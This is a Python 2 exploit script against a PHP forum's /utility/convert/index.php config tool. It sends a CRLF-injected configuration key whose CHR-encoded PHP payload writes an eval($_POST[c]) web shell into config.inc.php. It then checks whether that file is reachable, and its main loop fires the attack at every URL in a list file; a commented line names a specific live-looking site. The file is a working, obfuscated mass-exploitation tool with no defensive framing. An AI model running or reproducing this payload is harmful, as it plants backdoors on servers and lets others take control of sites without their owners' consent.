# encoding:utf-8

import requests
import os
import sys
import re
import urllib

def exploit(url):
    # url = ''
    # url = 'http://youcaidi.com/%D0%C2%BD%A8%CE%C4%BC%FE%BC%D0/utility/convert/index.php?a=config&source=d7.2_x1.5'
    host = url.split('//')[1].split('/')[0]
# /utility/convert/index.php?a=config&source=d7.2_x2.0 HTTP/1.1

    headers = {
            'Host': host,
            # 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:25.0) Gecko/20100101 Firefox/2X.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded'
            }
    # post_data =  {'newconfig[aaa%0a%0deval(CHR(101).CHR(118).CHR(97).CHR(108).CHR(40).CHR(34).CHR(36).CHR(95).CHR(80).CHR(79).CHR(83).CHR(84).CHR(91).CHR(99).CHR(93).CHR(59).CHR(34).CHR(41).CHR(59));//]':'aaaa', 'submit':'yes'}
    post_data = 'newconfig[aaa%0a%0deval(CHR(101).CHR(118).CHR(97).CHR(108).CHR(40).CHR(34).CHR(36).CHR(95).CHR(80).CHR(79).CHR(83).CHR(84).CHR(91).CHR(99).CHR(93).CHR(59).CHR(34).CHR(41).CHR(59));//]=aaaa&submit=yes'
    # en_data = urllib.urlencode(post_data)

    # print '*' * 50
    # print headers
    # print '*' * 50
    # print post_data
    # print '*' * 50
    # print en_data
    try:

        response = requests.post(url, headers=headers, data=post_data)
        print url, response.status_code
        url = 'http://'+host+'/convert/data/config.inc.php'
        print url, requests.get(url).status_code

    except Exception, e:
        print e

def main(url):

    exploit(url)


if __name__ == '__main__':
    os.system('clear')

    # sys.argv[1] = 'test'

    # if len(sys.argv) != 2:
        # print 'please enter url!!!!'

    # main(sys.argv[1])
    for url in open('urls.txt', 'r'):
        print '*' * 50
        main(url)

